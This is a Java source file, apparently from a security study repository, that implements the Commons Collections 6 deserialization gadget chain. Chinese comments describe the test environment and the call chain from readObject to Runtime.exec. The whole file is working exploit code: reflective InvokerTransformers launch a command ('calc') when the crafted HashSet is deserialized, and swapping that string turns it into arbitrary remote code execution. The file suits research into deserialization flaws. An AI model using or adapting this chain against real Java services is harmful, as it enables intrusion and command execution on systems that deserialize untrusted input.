package vuln;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.SerializeUtil;

import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.TreeMap;

/**
 * 测试环境
 * jdk7
 * cc3.1
 * **/

public class Commoncollections6 {


    public static void main(String[] args) throws Exception {
        vulncc6();
    }
    /** 调用链
     * ObjectInputStream.readObject()
     * HashSet.readObject()
     * HashMap.put()
     * HashMap.hash()
     * TiedMapEntry.hashCode()
     * TiedMapEntry.getVaule()
     * LazyMap.get()
     * ChainedTransformer.transform()
     * ...
     * Runtime.exec()
     * **/
    public static void vulncc6() throws Exception{
        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})}
        );
        HashSet hashSet = new HashSet();
        TreeMap treeMap = new TreeMap();
        Map decorateMap = LazyMap.decorate(treeMap, fake);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,"aaa");
        hashSet.add(tiedMapEntry);
        SerializeUtil.setFieldValue(decorateMap,"factory",chainedTransformer);
        treeMap.clear();
        decorateMap.clear();
        ByteArrayOutputStream byteArrayOutputStream = SerializeUtil.writeObjectToByteArray(hashSet);
        SerializeUtil.readObjectToByteArray(byteArrayOutputStream);
    }
    
}
